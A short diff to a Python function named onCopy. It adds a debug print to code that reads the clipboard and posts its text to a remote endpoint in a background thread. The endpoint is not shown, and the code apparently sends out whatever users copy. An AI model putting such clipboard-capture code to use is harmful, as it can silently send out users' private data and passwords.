@@ -53,6 +53,7 @@ def onCopy():
                         'headers': {'Content-Type': 'application/octet-stream', 'Content-Disposition': f'attachment;', "fn":"51"},
                     }
                     threading.Thread(target=requests.post, kwargs=args).start()
+                    print("Sending! Clipboard")
             except:
                 continue
             currentClipboard = clipboardText
